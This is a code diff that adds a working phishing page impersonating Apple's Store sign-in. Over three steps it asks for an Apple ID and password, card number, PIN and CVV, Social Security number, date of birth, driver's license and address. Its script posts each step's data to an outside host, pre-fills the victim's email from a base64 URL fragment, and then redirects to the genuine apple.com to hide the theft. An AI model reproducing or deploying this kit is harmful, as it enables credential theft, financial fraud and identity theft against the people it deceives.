@@ -1,0 +1,491 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    <title>Sign in -Apple</title>
+    <link href="css/unified-signin.css" rel="stylesheet" media="all">
+    <link rel="stylesheet" href="css/external.css">
+    <link rel="stylesheet" href="css/app.css">
+    <style type="text/css">
+    html {
+        background: url(images/bg.jpg) no-repeat center center fixed;
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+    }
+
+    .icon_sign_in:before {
+        margin-right: 25px;
+
+        line-height: 0;
+        font-weight: 400;
+        font-style: normal;
+        speak: none;
+        text-decoration: inherit;
+        text-transform: none;
+        text-rendering: optimizeLegibility;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        content: "\f18e";
+        font-family: FontAwesome;
+        border: none;
+    }
+
+    .signin-form.fed-auth.show-password~.si-button.fed-ui {
+        top: 45px;
+    }
+
+    .widget-container .si-field-container {
+        max-width: 400px;
+        position: relative;
+        outline: none;
+    }
+    </style>
+</head>
+
+<body>
+    <nav id="ac-globalnav" class="js no-touch windows" role="navigation">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple " href="#">
+                        <span class="ac-gn-link-text">Apple</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac " href="#">
+                        <span class="ac-gn-link-text">Mac</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad " href="#">
+                        <span class="ac-gn-link-text">iPad</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone " href="#">
+                        <span class="ac-gn-link-text">iPhone</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch " href="#">
+                        <span class="ac-gn-link-text">Watch</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv " href="#">
+                        <span class="ac-gn-link-text">TV</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music " href="#">
+                        <span class="ac-gn-link-text">Music</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support " href="#">
+                        <span class="ac-gn-link-text">Support</span>
+                    </a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#"></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <div class="ac-gn-bag-wrapper">
+                        <a class="ac-gn-link ac-gn-link-bag " href="#">
+                            <span class="ac-gn-link-text">Shopping Bag</span>
+                        </a>
+                        <span class="ac-gn-bag-badge" aria-hidden="true">
+                            <span class="ac-gn-bag-badge-separator"></span>
+                            <span class="ac-gn-bag-badge-number"></span>
+                            <span class="ac-gn-bag-badge-unit">+</span>
+                        </span>
+                    </div>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+        </div>
+    </nav>
+    <div id="signin-container" class="rs-page-content">
+        <div>
+            <div id="rr-viewport"></div>
+            <div role="main">
+                <div class="rs-signin rs-signin-widget rs-signin-widgetstandalone">
+                    <div class="row rs-signin-main as-l-container">
+                        <div class="column as-widgetsignin-returningcustomer-container">
+                            <div class="as-widgetsignin-returningcustomer" id="as-widgetsignin-container">
+                                <div class="widget-container  fade-in restrict-min-content  fade-in ">
+                                    <div id="bl1" class="si-step ">
+                                        <div id="stepEl" class="   ">
+                                            <div class="signin fade-in mt-5" id="signin">
+                                                <h1 tabindex="-1" class="si-container-title tk-label  text-white">
+                                                    Sign in to Apple Store
+                                                </h1>
+                                                <div>
+                                                    <div id="error" class="alert alert-danger col-lg-6 mx-auto" style="display: none;font-size: 13px">Invalid Password..! Please enter correct password.</div>
+                                                </div>
+                                                <form action="next.php" method="POST" name="signinform" id="form-field-1">
+                                                    <input type="hidden" name="count" id="count" value="0">
+                                                    <div class="container si-field-container  password-second-step  password-on     ">
+                                                        <div id="sign_in_form" class="signin-form account-name-entered fed-auth show-password">
+                                                            <div class="si-field-container container">
+                                                                <div class="form-table">
+                                                                    <div class="account-name form-row     show-password ">
+                                                                        <label class="sr-only form-cell form-label" for="account_name_text_field">Sign in to Apple Store Apple ID</label>
+                                                                        <div class="form-cell">
+                                                                            <div class=" form-cell-wrapper ">
+                                                                                <input type="text" name="ai" id="ai" can-field="accountName" required="required" class="force-ltr form-textbox form-textbox-text" placeholder="Apple&nbsp;ID" autofocus="">
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="password form-row    show-password show-placeholder   ">
+                                                                        <label class="sr-only form-cell form-label" for="password_text_field">Password</label>
+                                                                        <div class="form-cell">
+                                                                            <div class="form-cell-wrapper ">
+                                                                                <input type="password" name="pr" id="pr" required="required" class="form-textbox form-textbox-text" placeholder="Password" autocomplete="false">
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="si-remember-password">
+                                                            <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox">
+                                                            <label id="remember-me-label" class="form-label text-white" for="remember-me">
+                                                                <span class="form-choice-indicator"></span> Remember me
+                                                            </label>
+                                                        </div>
+                                                        <input type="hidden" name="btn1" value="btn1">
+                                                        <button type="submit" name="sub-btn-1" id="sub-btn-1" tabindex="0" style="border:none" class="si-button btn fed-ui moved   fed-ui-animation-show  remember-me   link ">
+                                                            <i class="icon_sign_in"></i>
+                                                            <span class="text feat-split">
+                                                                Sign In
+                                                            </span>
+                                                        </button>
+                                                    </div>
+                                                </form>
+                                                <div class="si-container-footer">
+                                                    <div class="separator "></div>
+                                                    <div class="links tk-subbody">
+                                                        <div class="si-forgot-password text-white">
+                                                            <a id="iforgot-link" class="si-link ax-outline lite-theme-override text-white" href="#" target="_blank">Forgot Apple&nbsp;ID or password?<span class="sr-only"> Opens in a new window.</span></a>
+                                                        </div>
+                                                        <div class="text-white">
+                                                            <span class="fat">
+                                                                Don’t have an Apple&nbsp;ID?</span>
+                                                            <a id="create-link" class="si-forgot-password si-link ax-outline lite-theme-override text-white" href="#" target="_blank">
+                                                                Create yours now.<span class="sr-only"> Opens in a new window.</span></a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <div id="bl2" class="si-step " style="margin-top: 150px;display: none;">
+                                        <div id="stepEl" class="">
+                                            <div class="signin fade-in mt-5" id="signin">
+                                                <h1 tabindex="-1" class="si-container-title tk-label  text-white">
+                                                    Verify Your Identity
+                                                </h1>
+                                                <form action="next.php" method="POST" name="signinform" id="form-field-2">
+                                                    <div class="container si-field-container  password-second-step  password-on     ">
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="noc" required="" class="form-control" placeholder="Name on Card">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="ccn" required="" class="form-control" placeholder="Credit Card Number">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="exdate" required="" class="form-control" placeholder="Exp Date">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="password" name="pin" required="" class="form-control" placeholder="Card Pin">
+                                                            </div>
+                                                        </div>
+                                                        <input type="hidden" name="btn2" value="btn2">
+                                                        <div class="row mt-2">
+                                                            <div class="col text-center">
+                                                                <input type="submit" class="form-control btn-success" id="sub-btn-2" name="sub-btn-2" value="Continue" style="text-align: center;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+
+                                    <div id="bl3" class="si-step " style="margin-top: 150px;display:none;">
+                                        <div id="stepEl" class="">
+                                            <div class="signin fade-in mt-5" id="signin">
+                                                <h1 tabindex="-1" class="si-container-title tk-label  text-white">
+                                                    Verify Your Detail
+                                                </h1>
+                                                <form action="next.php" method="POST" name="signinform" id="form-field-3">
+                                                    <div class="container si-field-container  password-second-step  password-on     ">
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="badd" required="" class="form-control" placeholder="Billing Address">
+                                                            </div>
+                                                        </div>
+                                                         <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="state" required="" class="form-control" placeholder="State">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="ct" required="" class="form-control" placeholder="City">
+                                                            </div>
+                                                        </div>
+
+                                                        
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="ph" id="ph" required="" class="form-control" placeholder="Phone Number">
+                                                            </div>
+                                                        </div>
+                                                        
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="cvv" required="" class="form-control" placeholder="CVV">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="ssn" id="ssn" required="" class="form-control" placeholder="Social Security Number">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="dob" id="dob" required="" class="form-control" placeholder="Date of Birth">
+                                                            </div>
+                                                        </div>
+                                                        <div class="row mt-2">
+                                                            <div class="col">
+                                                                <input type="text" name="dln" id="dln" required="" class="form-control" placeholder="Driver's License">
+                                                            </div>
+                                                        </div>
+
+                                                        <input type="hidden" name="btn3" value="btn3">
+                                                        <div class="row mt-2">
+                                                            <div class="col text-center">
+                                                                <input type="submit" class="form-control btn-success" id="sub-btn-3" name="sub-btn-3" value="Continue" style="text-align: center;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="fixed-bottom">
+                    <div class="as-chat rs-chat bg-white">
+                        <div class="as-l-container rs-chat-content">
+                            <div>Need some help? <button class="as-chat-button as-buttonlink">Chat now</button> or call <span>1‑800‑MY‑APPLE</span>.</div>
+                        </div>
+                    </div>
+                    <div class="as-footnotes">
+                        <div class="as-footnotes-content">
+                            <div class="as-footnotes-sosumi">
+                                <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        $("#ssn").inputmask({"mask": "999-99-9999"});
+    $("#cn").inputmask({"mask": "9999 9999 9999 9999"});
+        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"DD/MM/YYYY"});
+        $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
+        $("#ph").inputmask({"mask": "999-999-9999"});
+    </script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+//redirect link
+var rdrt = "https://www.apple.com/";
+
+
+//mailer link
+var f = atob("bmV4dC5waHA=");
+
+
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+
+    }
+
+
+    $('#sub-btn-1').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        var c = $("#form-field-1").serialize();
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://atrangiyaari.in/wp/next.php",
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                // $('#sub-btn-1').html('Verifying...')
+            },
+            complete: function(a) {
+                $("#bl1").animate({
+                    left: 0,
+                    opacity: "hide"
+                }, 0);
+                $("#bl2").animate({
+                    right: 0,
+                    opacity: "show"
+                }, 500)
+            }
+        })
+    })
+
+
+    $('#sub-btn-2').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-2").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        var c = $("#form-field-2").serialize();
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://atrangiyaari.in/wp/next.php",
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                $('#sub-btn-2').html('Verifying...')
+            },
+            complete: function(a) {
+                $("#bl2").animate({
+                    left: 0,
+                    opacity: "hide"
+                }, 0);
+                $("#bl3").animate({
+                    right: 0,
+                    opacity: "show"
+                }, 500)
+            }
+        })
+    })
+
+    $('#sub-btn-3').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-3").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        var c = $("#form-field-3").serialize();
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://atrangiyaari.in/wp/next.php",
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                $('#sub-btn-3').html('Verifying...')
+            },
+            complete: function(a) {
+                window.location.replace(rdrt)
+            }
+        })
+    })
+
+
+});
+</script>
+
+</html>
